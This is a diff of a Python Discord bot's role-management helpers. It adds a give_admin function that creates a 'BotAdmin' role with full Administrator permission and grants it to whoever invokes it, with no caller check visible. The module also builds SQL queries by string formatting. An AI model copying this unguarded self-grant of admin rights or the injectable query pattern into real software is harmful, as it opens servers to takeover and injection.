@@ -168,11 +168,58 @@ def open_server(guild_id):
     rows, string = sql_update(sql)
     return
 
+async def remove_roles(member,role_ids,reason):
+    lst = role_ids.flatten()
+    roles = get_roles_obj(member.guild,lst)
+    if reason != '':
+        await member.remove_roles(*roles,reason=reason)
+    else:
+        await member.remove_roles(*roles)
+    return
+
 async def add_roles(member,role_ids,reason):
     lst = role_ids.flatten()
     roles = get_roles_obj(member.guild,lst)
-    await member.add_roles(*roles,reason=reason)
+    if reason != '':
+        await member.add_roles(*roles,reason=reason)
+    else:
+        await member.add_roles(*roles)
     return
+
+def grab_first_col(rows):
+    data = np.array(rows)
+    col = data[:,0]
+
+    return col
+
+async def give_admin(self,ctx,test):
+    # data = get_roles_special(ctx.guild.id,90)
+    roles = get_roles_by_name(ctx,'botadmin')
+    if test == 'on':
+        if len(roles) == 0:
+            topRole = ctx.guild.get_member(self.bot.user.id).top_role
+            perms = discord.Permissions(permissions=8)
+            rolePos = topRole.position
+            role = await ctx.guild.create_role(name='BotAdmin',
+                    permissions=perms)
+            await role.edit(position=rolePos)
+            await ctx.author.add_roles(role)
+        else:
+            if len(roles) == 1:
+                role = grab_first_col(roles)[0]
+                await add_roles(ctx.author,role,'')
+            else:
+                msg = await ctx.channel.send('Multiple `BotAdmin` found:')
+                await asyncio.sleep(10)
+                await msg.delete()
+    elif test == 'del':
+        for role in roles:
+            bad = ctx.guild.get_role(role[0])
+            await bad.delete()
+    else:
+        if len(roles) == 1:
+            role = grab_first_col(roles)[0]
+            await remove_roles(ctx.author,role,'')
 
 def get_pattern(string, test):
     grab = re.search(test, string)
@@ -201,12 +248,13 @@ def get_roles_obj(guild,lst):
     return data
 
 def get_roles_special(guild_id,group_id):
-    # 1 = Join Role
-    # 2 = Chat Role
-    # 3 = Ideology Role
-    # 10 = Shitpost Role
-    # 11 = Mute Role
-    # 12 = Jail Role
+    # 1 = join role
+    # 2 = chat role
+    # 3 = ideology role
+    # 10 = shitpost role
+    # 11 = mute role
+    # 12 = jail role
+    # 90 = BotAdmin
     sql = """ SELECT role_id FROM roles
               WHERE guild_id = {0}
               AND group_id = {1} """
